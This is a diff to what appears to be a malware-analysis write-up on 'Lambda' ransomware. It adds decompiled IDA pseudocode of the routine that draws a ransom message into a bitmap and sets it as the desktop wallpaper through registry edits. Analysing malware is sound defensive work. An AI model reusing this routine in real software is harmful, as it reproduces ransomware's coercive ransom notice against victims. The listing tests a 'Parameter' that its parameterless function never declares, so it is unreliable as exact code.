@@ -41,7 +41,7 @@ We will study the malware using specific tools like Detect It Easy IDA Pro.
 
 ![information](/images/lambda-08.png)
 
-### FindFirstFile API search
+### Search file process
 
 ```
 ULONG __stdcall StartAddress(const WCHAR *Parameter)
@@ -255,3 +255,151 @@ LABEL_43:
     -   Memory allocated (`HeapFree`) for each enumerated item is released.
     -   If the variable `v28` is set, a log is written indicating the end of the exploration of large files.
     -   The function concludes by freeing the memory of `v1` and returning `0`.
+
+### Change Wallpaper
+
+```
+void sub_4096B0()
+{
+  HDC DC; // eax
+  HDC v1; // edi
+  HDC CompatibleDC; // ebx
+  int DeviceCaps; // eax
+  int v4; // esi
+  HFONT FontW; // eax
+  HBITMAP CompatibleBitmap; // eax
+  DWORD v7; // esi
+  void *v8; // edi
+  LPVOID v9; // eax
+  HANDLE FileW; // eax
+  int v11; // eax
+  int v12; // eax
+  WCHAR String[2048]; // [esp+10h] [ebp-1280h] BYREF
+  WCHAR pszPath[262]; // [esp+1010h] [ebp-280h] BYREF
+  struct tagSIZE psizl; // [esp+121Ch] [ebp-74h] BYREF
+  struct tagRECT rc; // [esp+1224h] [ebp-6Ch] BYREF
+  char bmi[46]; // [esp+1234h] [ebp-5Ch] BYREF
+  int v18; // [esp+1262h] [ebp-2Eh]
+  int v19; // [esp+1266h] [ebp-2Ah]
+  HGDIOBJ ho; // [esp+126Ch] [ebp-24h]
+  HDC v21; // [esp+1270h] [ebp-20h]
+  DWORD nNumberOfBytesToWrite; // [esp+1274h] [ebp-1Ch]
+  HDC v23; // [esp+1278h] [ebp-18h]
+  HBITMAP hbm; // [esp+127Ch] [ebp-14h]
+  DWORD NumberOfBytesWritten; // [esp+1280h] [ebp-10h] BYREF
+  int cchText; // [esp+1284h] [ebp-Ch]
+  int cy; // [esp+1288h] [ebp-8h]
+  HKEY phkResult; // [esp+128Ch] [ebp-4h] BYREF
+
+  if ( !Parameter )
+  {
+    if ( dword_430940 )
+    {
+      DC = GetDC(0);
+      v1 = DC;
+      v21 = DC;
+      if ( DC )
+      {
+        CompatibleDC = CreateCompatibleDC(DC);
+        v23 = CompatibleDC;
+        if ( CompatibleDC )
+        {
+          phkResult = (HKEY)((GetDeviceCaps(v1, 8) + 1) & 0xFFFFFFFE);
+          cy = (GetDeviceCaps(v1, 10) + 1) & 0xFFFFFFFE;
+          DeviceCaps = GetDeviceCaps(v1, 88);
+          v4 = cy;
+          FontW = CreateFontW(6 * (cy / DeviceCaps), 0, 0, 0, 512, 0, 0, 0, 1u, 9u, 0, 3u, 0, L"Arial");
+          ho = FontW;
+          if ( FontW )
+          {
+            if ( SelectObject(CompatibleDC, FontW) )
+            {
+              cchText = wsprintfW(
+                          String,
+                          L"All of your files are stolen and encrypted!\r\n"
+                           "Find LAMBDA_README.txt and follow instructions");
+              if ( GetTextExtentPoint32W(CompatibleDC, String, cchText, &psizl) )
+              {
+                CompatibleBitmap = CreateCompatibleBitmap(CompatibleDC, (int)phkResult, v4);
+                hbm = CompatibleBitmap;
+                if ( CompatibleBitmap )
+                {
+                  if ( SelectObject(CompatibleDC, CompatibleBitmap) )
+                  {
+                    SetTextColor(CompatibleDC, 0xFFFFFFu);
+                    SetBkMode(CompatibleDC, 2);
+                    SetBkColor(CompatibleDC, 0);
+                    rc.left = 0;
+                    rc.top = (v4 >> 1) - psizl.cy;
+                    rc.right = (LONG)phkResult;
+                    rc.bottom = v4;
+                    if ( DrawTextW(CompatibleDC, String, cchText, &rc, 0x211u) )
+                    {
+                      *(_WORD *)&bmi[40] = 19778;
+                      NumberOfBytesWritten = 0;
+                      v19 = 54;
+                      *(_DWORD *)bmi = 40;
+                      v7 = 2 * (_DWORD)phkResult * v4;
+                      *(_DWORD *)&bmi[4] = phkResult;
+                      nNumberOfBytesToWrite = v7;
+                      *(_DWORD *)&bmi[42] = v7 + 54;
+                      v18 = 0;
+                      *(_DWORD *)&bmi[8] = cy;
+                      *(_DWORD *)&bmi[12] = 1048577;
+                      memset(&bmi[16], 0, 24);
+                      v8 = HeapAlloc(hHeap, 8u, v7);
+                      cchText = (int)v8;
+                      if ( !v8 )
+                      {
+                        do
+                        {
+                          Sleep(0x64u);
+                          v9 = HeapAlloc(hHeap, 8u, v7);
+                          cchText = (int)v9;
+                        }
+                        while ( !v9 );
+                        CompatibleDC = v23;
+                        v8 = v9;
+                      }
+                      if ( GetDIBits(CompatibleDC, hbm, 0, cy, v8, (LPBITMAPINFO)bmi, 0) )
+                      {
+                        SHGetFolderPathW(0, 35, 0, 0, pszPath);
+                        lstrcatW(pszPath, L"\\LLTKTPR.bmp");
+                        FileW = CreateFileW(pszPath, 0x40000000u, 0, 0, 1u, 0x80u, 0);
+                        cy = (int)FileW;
+                        if ( FileW != (HANDLE)-1 )
+                        {
+                          WriteFile(FileW, &bmi[40], 0xEu, &NumberOfBytesWritten, 0);
+                          WriteFile((HANDLE)cy, bmi, 0x28u, &NumberOfBytesWritten, 0);
+                          WriteFile((HANDLE)cy, v8, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
+                          CloseHandle((HANDLE)cy);
+                          if ( !RegOpenKeyExW(HKEY_CURRENT_USER, L"Control Panel\\Desktop", 0, 0x20106u, &phkResult) )
+                          {
+                            v11 = lstrlenW(L"2");
+                            RegSetValueExW(phkResult, L"WallpaperStyle", 0, 1u, (const BYTE *)L"2", 2 * v11 + 2);
+                            v12 = lstrlenW(L"0");
+                            RegSetValueExW(phkResult, L"TileWallpaper", 0, 1u, (const BYTE *)L"0", 2 * v12 + 2);
+                            RegCloseKey(phkResult);
+                            v8 = (void *)cchText;
+                          }
+                          SystemParametersInfoW(0x14u, 0, pszPath, 3u);
+                        }
+                      }
+                      HeapFree(hHeap, 0, v8);
+                      v1 = v21;
+                    }
+                  }
+                  DeleteObject(hbm);
+                }
+              }
+            }
+            DeleteObject(ho);
+          }
+          DeleteDC(CompatibleDC);
+        }
+        ReleaseDC(0, v1);
+      }
+    }
+  }
+}
+```
